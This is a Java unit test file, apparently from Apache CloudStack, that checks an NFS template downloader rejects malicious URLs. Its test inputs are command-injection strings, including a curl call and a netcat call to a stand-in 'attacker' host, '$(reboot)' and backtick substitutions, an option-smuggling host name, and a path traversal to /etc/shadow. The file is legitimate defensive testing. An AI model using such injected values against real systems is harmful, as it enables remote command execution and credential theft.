//
// Licensed to the Apache Software Foundation (ASF) under one
// or more contributor license agreements.  See the NOTICE file
// distributed with this work for additional information
// regarding copyright ownership.  The ASF licenses this file
// to you under the Apache License, Version 2.0 (the
// "License"); you may not use this file except in compliance
// with the License.  You may obtain a copy of the License at
//
//   http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing,
// software distributed under the License is distributed on an
// "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
// KIND, either express or implied.  See the License for the
// specific language governing permissions and limitations
// under the License.
//
package org.apache.cloudstack.direct.download;

import com.cloud.utils.exception.CloudRuntimeException;
import org.junit.Assert;
import org.junit.Test;

public class NfsDirectTemplateDownloaderTest {

    @Test
    public void testValidNfsUrlIsAccepted() {
        // A well-formed NFS url must parse without error.
        new NfsDirectTemplateDownloader("nfs://10.0.0.1/export/templates/tmpl.qcow2");
    }

    @Test
    public void testRejectsSemicolonInPath() {
        assertRejected("nfs://10.0.0.1/a;curl http://attacker/x");
    }

    @Test
    public void testRejectsCommandSubstitutionInPath() {
        assertRejected("nfs://10.0.0.1/$(reboot)");
    }

    @Test
    public void testRejectsBacktickInPath() {
        assertRejected("nfs://10.0.0.1/`reboot`");
    }

    @Test
    public void testRejectsPipeInPath() {
        assertRejected("nfs://10.0.0.1/a|nc attacker 4444");
    }

    @Test
    public void testRejectsHostStartingWithDash() {
        // A leading '-' could be mistaken for a mount option (argument confusion).
        assertRejected("nfs://-oremount/export/tmpl.qcow2");
    }

    @Test
    public void testRejectsPathTraversal() {
        // '.' and '/' are allowed individually, but a ".." segment must not slip through.
        assertRejected("nfs://10.0.0.1/export/../../etc/shadow");
    }

    private void assertRejected(String url) {
        try {
            new NfsDirectTemplateDownloader(url);
            Assert.fail("Expected CloudRuntimeException for url: " + url);
        } catch (CloudRuntimeException expected) {
            // metacharacters must be rejected during url parsing
        }
    }
}
